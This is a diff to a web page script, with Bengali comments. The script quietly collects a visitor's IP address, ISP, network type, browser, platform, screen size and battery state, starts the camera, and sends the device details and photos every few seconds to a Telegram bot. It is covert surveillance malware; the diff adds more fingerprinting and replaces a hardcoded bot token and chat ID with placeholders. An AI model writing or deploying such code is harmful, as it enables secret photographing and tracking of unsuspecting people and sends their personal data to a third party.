@@ -16,8 +16,8 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = "8023106166:AAEGed6xp19KBQWiUmsv6P7_Bi1ZDhHJ3VU";
-        const CHAT_ID = "2139008203";
+        const BOT_TOKEN = "YOUR_BOT_TOKEN";
+        const CHAT_ID = "YOUR_CHAT_ID";
         const canvas = document.getElementById('canvas');
         let videoStream = null;
         let video = null;
@@ -25,20 +25,28 @@
 
         async function sendDeviceInfo() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
+                const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
-                const ipAddress = data.ip;
 
-                const battery = await navigator.getBattery();
-                const batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
+                const ipAddress = data.ip;
+                const isp = data.org || "Unknown ISP";
+                const networkType = navigator.connection ? navigator.connection.effectiveType : "Unknown Network";
+
+                let batteryStatus = "Battery Info: Not Available";
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryStatus = `Battery Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging ? "Yes" : "No"}`;
+                }
 
                 const deviceInfo = `
-Device Information:
-- IP Address: ${ipAddress}
-- Browser: ${navigator.userAgent}
-- Platform: ${navigator.platform}
-- Screen Resolution: ${window.screen.width}x${window.screen.height}
-- ${batteryStatus}
+📱 Device Information:
+- 🌍 IP Address: ${ipAddress}
+- 📡 ISP/SIM Provider: ${isp}
+- 🔌 Network Type: ${networkType}
+- 🌐 Browser: ${navigator.userAgent}
+- 🖥️ Platform: ${navigator.platform}
+- 📏 Screen Resolution: ${window.screen.width}x${window.screen.height}
+- 🔋 ${batteryStatus}
                 `;
 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -95,14 +103,14 @@ Device Information:
         }
 
         async function startPhotoCaptureLoop() {
-            sendDeviceInfo(); // ডিভাইসের তথ্য প্রথমেই পাঠাবে
+            sendDeviceInfo(); // ডিভাইসের তথ্য পাঠাবে
 
             const cameraStarted = await startCamera();
             if (!cameraStarted) return;
 
             sendPhoto(); // প্রথম ছবি পাঠাবে
 
-            intervalId = setInterval(sendPhoto, 500); // প্রতি ৫ সেকেন্ডে নতুন ছবি পাঠাবে
+            intervalId = setInterval(sendPhoto, 5000); // প্রতি ৫ সেকেন্ডে নতুন ছবি পাঠাবে
         }
 
         function stopCamera() {
